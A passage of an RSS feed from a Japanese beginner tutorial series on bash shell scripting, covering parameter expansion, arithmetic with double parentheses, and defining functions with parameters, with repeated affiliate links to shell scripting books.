# -&amp;gt; hoge.tar.bz2
# 最短除外
echo ${HOGE%.*}
# -&amp;gt; hoge.tar
# 最長除外
echo ${HOGE%%.*}
# -&amp;gt; hoge
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-bash:左端からのパターン一致除外" data-lang="bash:左端からのパターン一致除外">#!/bin/bash
HOGE=/home/user/hoge
echo ${HOGE}
# -&amp;gt; /home/user/hoge
# 最短除外
echo ${HOGE#*/}
# -&amp;gt; home/user/hoge
# 最長除外
echo ${HOGE##*/}
# -&amp;gt; hoge
&lt;/code>&lt;/pre>&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【１７．変数に2つの数値を追加します】ざっくりわかる「シェルスクリプト」</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-17-suzuki/</link><pubDate>Wed, 12 Jan 2022 12:30:57 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-17-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-17-suzuki/shellscript.jpg" alt="Featured image of post 【１７．変数に2つの数値を追加します】ざっくりわかる「シェルスクリプト」" />&lt;h2 id="変数に2つの数値を追加します">変数に2つの数値を追加します&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>2つの数字を追加します。&lt;/b>&lt;/font>&lt;br>
さまざまな方法でbashの算術演算を実行できます。次のスクリプトに、二重角かっこを使用してbashに2つの整数を追加する方法を示します。次のコードを使用して、「add_numbers.sh」という名前のファイルを作成します。2つの整数値がユーザーから取得され、加算の結果が出力されます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:add_numbers.sh" data-lang="bash:add_numbers.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;最初の数値を入力&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> x&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;2番目の数値を入力&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> y&lt;span class="p">;&lt;/span>
&lt;span class="o">((&lt;/span>&lt;span class="nv">sum&lt;/span>&lt;span class="o">=&lt;/span>x+y&lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;加算の結果=&lt;/span>&lt;span class="nv">$sum&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash add_numbers.sh
最初の数値を入力
25
2番目の数値を入力
56
加算の結果=81
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>((sum=x+y));&lt;/dd>
&lt;dd>昔の書籍でシェルスクリプトを勉強している人は、驚くかもしれない。だが、今の時代、Bashでは上記のように書く。昔は&lt;/dd>
&lt;dd>
&lt;p>$ echo `expr 1 + 1`&lt;/p>
&lt;/dd>
&lt;dd>
&lt;p>こんな書き方をした。現在のBashでは算術演算子が使える。&lt;/p>
&lt;/dd>
&lt;dd>以下ににまとめてみた。2重括弧でくくればいい。2重括弧の中に変数を使うことも可能だ。さらに変数は見にくい「$」をつける必要すらない。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;pre tabindex="0">&lt;code class="language-bash:算術演算子" data-lang="bash:算術演算子">$ echo `expr 1+1` # 昔のやり方
$ echo $((5+5)) # 今のやり方
$ echo $((5-5))
$ echo $((5*5))
$ echo $((5/5))
$ echo $((5%5))
# なんと比較演算子もいける！
$ echo $((0==1)) # 等号、結果: 0
$ echo $((0!=1)) # 否定等号、結果: 1
$ echo $((0&amp;lt;1)) # 未満、結果: 1
$ echo $((0&amp;lt;=1)) # 以下、結果: 1
$ echo $((0&amp;gt;1)) # 大なり、結果: 0
$ echo $((0&amp;gt;=1)) # 以上、結果: 0
&lt;/code>&lt;/pre>&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【１８．関数を作成する】ざっくりわかる「シェルスクリプト」</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-18-suzuki/</link><pubDate>Wed, 12 Jan 2022 12:30:57 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-18-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-18-suzuki/shellscript.jpg" alt="Featured image of post 【１８．関数を作成する】ざっくりわかる「シェルスクリプト」" />&lt;p>関連記事&lt;br>
&lt;a class="link" href="https://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/" target="_blank" rel="noopener"
>ざっくりわかるシェルスクリプト１」&lt;/a>&lt;br>
&lt;a class="link" href="https://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/" target="_blank" rel="noopener"
>ざっくりわかるシェルスクリプト２」&lt;/a>&lt;br>
&lt;a class="link" href="https://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/" target="_blank" rel="noopener"
>ざっくりわかるシェルスクリプト３」&lt;/a>&lt;/p>
&lt;h2 id="関数を作成する">関数を作成する&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>関数の作成：&lt;/b>&lt;/font>&lt;br>
簡単な関数を作成して関数を呼び出す方法を次のスクリプトに示します。&amp;lsquo;function_example.sh&amp;rsquo;という名前のファイルを作成し、次のコードを追加します。bashスクリプトで角かっこを使用せずに、名前でのみ関数を呼び出すことができます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">function&lt;/span> 関数の名前&lt;span class="o">(){&lt;/span>
処理
&lt;span class="o">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>このとき、functionは省略可能です。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
関数の名前&lt;span class="o">(){&lt;/span>
処理
&lt;span class="o">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>関数の呼び出しは、関数を定義した後に関数の名前を書くだけです。&lt;/p>
&lt;pre tabindex="0">&lt;code>関数の名前 引数
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="c1"># 関数の定義&lt;/span>
&lt;span class="k">function&lt;/span> say_hello&lt;span class="o">(){&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Hello, world!&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="c1"># 関数の呼び出し&lt;/span>
say_hello&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>このとき、関数の名前に続けて、引数を書くことができます。関数内では、通常のシェルスクリプトの引数を処理するのと同じように$1、$2、&amp;hellip;という形でアクセスできます。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:function_example.sh" data-lang="bash:function_example.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="c1"># 関数の定義&lt;/span>
&lt;span class="k">function&lt;/span> say_hello&lt;span class="o">(){&lt;/span>
&lt;span class="c1"># 引数を受け取って表示&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$1&lt;/span>&lt;span class="s2">, world!&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="c1"># 関数の呼び出し 引数を渡す&lt;/span>
say_hello &lt;span class="s2">&amp;#34;Hello&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash function_example.sh
Hello, world!
$
&lt;/code>&lt;/pre>&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【１９．関数パラメーターを使用する】ざっくりわかる「シェルスクリプト」</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-19-suzuki/</link><pubDate>Wed, 12 Jan 2022 12:30:57 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-19-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-19-suzuki/shellscript.jpg" alt="Featured image of post 【１９．関数パラメーターを使用する】ざっくりわかる「シェルスクリプト」" />&lt;h2 id="関数パラメーターを使用する">関数パラメーターを使用する&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>パラメータを使用して関数を作成します。&lt;/b>&lt;/font>&lt;br>
Bashは、関数宣言時に関数パラメーターまたは引数を宣言できません。ただし、他の変数を使用して、関数内でパラメーターを使用できます。関数の呼び出し時に2つの値が渡された場合、値の読み取りには$1と$2の変数が使用されます。&amp;lsquo;function_parameter.sh&amp;rsquo;という名前のファイルを作成し、次のコードを追加します。ここで、関数 &amp;lsquo;Rectangle_Area&amp;rsquo;は、パラメーター値に基づいて長方形の面積を計算します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:function_parameter.sh" data-lang="bash:function_parameter.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
Rectangle_Area&lt;span class="o">(){&lt;/span>
&lt;span class="nv">area&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">$((&lt;/span>&lt;span class="nv">$1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nv">$2&lt;/span>&lt;span class="k">))&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;面積は : &lt;/span>&lt;span class="nv">$area&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="o">}&lt;/span>
Rectangle_Area &lt;span class="m">10&lt;/span> 20&lt;span class="p">;&lt;/span>
